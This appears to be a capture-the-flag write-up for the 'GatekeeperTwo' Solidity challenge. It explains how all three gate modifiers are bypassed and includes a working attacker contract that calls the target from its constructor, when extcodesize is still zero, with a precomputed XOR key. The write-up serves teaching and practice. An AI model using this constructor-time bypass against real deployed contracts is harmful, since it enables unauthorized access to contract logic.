contract code:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability:** All three modifiers can be satisfied by calling from a contract while it is still being constructed.
- `gateOne` requires that `msg.sender != tx.origin`, so the call must be relayed through a contract rather than sent directly from an EOA.
- `gateTwo` checks `extcodesize(caller())` and requires it to be `0`. Normally this would block any contract-based call, since a deployed contract always has non-zero code size. However, during a contract's own constructor execution, its runtime code has not been stored on-chain yet, so `extcodesize` of `address(this)` (and therefore of `msg.sender` as seen by the callee) is still `0` at that point. Making the call to `enter` from inside the attacker's constructor bypasses this check entirely.
- `gateThree` requires `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`. XOR-ing any value with all-ones (`type(uint64).max`) is equivalent to bitwise NOT, so the correct key is simply the bitwise complement of the truncated hash of the caller's own address: `_gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`. Since `msg.sender` is deterministic (the attacker contract's own address, known via `address(this)` inside its constructor), this key can be computed and supplied in the very same transaction that deploys the attacker.

## Exploit Steps
1. Deploy an attacker contract whose constructor computes the key from its own address and immediately calls `enter`, so the entire attack (deployment + call) happens in one transaction, before any code is ever stored at the attacker's address:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperDueBraker {
    constructor(address _target) {
        uint64 baseHash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 reversedHash = ~baseHash;

        bytes8 gateKey = bytes8(reversedHash);
        IGatekeeperTwo(_target).enter(gateKey);
    }
}
```
2. Pass the `GatekeeperTwo` instance address as the constructor argument when deploying `GatekeeperDueBraker`. Because the call to `enter` happens inside the constructor:
   - `msg.sender` (the attacker contract) has `tx.origin` set to your EOA, but they differ, satisfying `gateOne`.
   - `extcodesize(caller())` is still `0` since the attacker's runtime code hasn't been written to the chain yet, satisfying `gateTwo`.
   - `reversedHash` is exactly the bitwise complement of `keccak256(address(this))` truncated to 8 bytes, so XOR-ing it back with the hash inside `gateThree` yields `type(uint64).max`, satisfying `gateThree`.
3. Verify the State: Confirm `entrant()` on the `GatekeeperTwo` instance now returns your EOA address, proving all three gates were bypassed within the single deployment transaction of the attacker contract.
